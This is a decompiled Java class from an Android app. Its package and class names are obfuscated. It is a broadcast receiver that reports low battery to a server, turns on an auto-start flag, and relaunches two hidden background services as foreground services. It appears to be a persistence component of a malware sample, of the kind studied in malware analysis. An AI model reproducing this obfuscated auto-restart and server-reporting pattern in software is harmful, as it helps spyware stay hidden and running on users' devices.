/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.BroadcastReceiver
 *  android.content.Context
 *  android.content.Intent
 *  android.os.Build$VERSION
 */
package linker.resourcer.encoder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import linker.resourcer.encoder.Vsvtpr$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.aaskrfyvhoypymnzlskbzwpyr;
import linker.resourcer.encoder.lqvpqwmhpvnnlhskxyjdwphzvsl;
import linker.resourcer.encoder.qswemlflptdlumxqnjrlg;
import linker.resourcer.encoder.tqvrhaaccrutxfxdqsvweshxhwtl;
import linker.resourcer.encoder.vyklwirattpkwkqagsbrm;

public class Vsvtpr
extends BroadcastReceiver {
    static /* synthetic */ void lambda$onReceive$0(Intent intent, Context context) {
        try {
            if (intent.getAction() != null && "android.intent.action.BATTERY_LOW".equals(intent.getAction())) {
                lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(context, "Battery State", "Battery is low");
            }
            vyklwirattpkwkqagsbrm.WriteBool(context, aaskrfyvhoypymnzlskbzwpyr.AutoStartOn, true);
            if (!tqvrhaaccrutxfxdqsvweshxhwtl.isServiceRunning(context, lqvpqwmhpvnnlhskxyjdwphzvsl.class)) {
                intent = new Intent(context, lqvpqwmhpvnnlhskxyjdwphzvsl.class);
                if (Build.VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent);
                } else {
                    context.startService(intent);
                }
            }
            intent = new Intent(context, qswemlflptdlumxqnjrlg.class);
            if (!tqvrhaaccrutxfxdqsvweshxhwtl.isServiceRunning(context, qswemlflptdlumxqnjrlg.class)) {
                if (Build.VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent);
                } else {
                    context.startService(intent);
                }
            }
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    public void onReceive(Context context, Intent intent) {
        try {
            Vsvtpr$$ExternalSyntheticLambda0 vsvtpr$$ExternalSyntheticLambda0 = new Vsvtpr$$ExternalSyntheticLambda0(intent, context);
            Thread thread = new Thread(vsvtpr$$ExternalSyntheticLambda0);
            thread.start();
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }
}

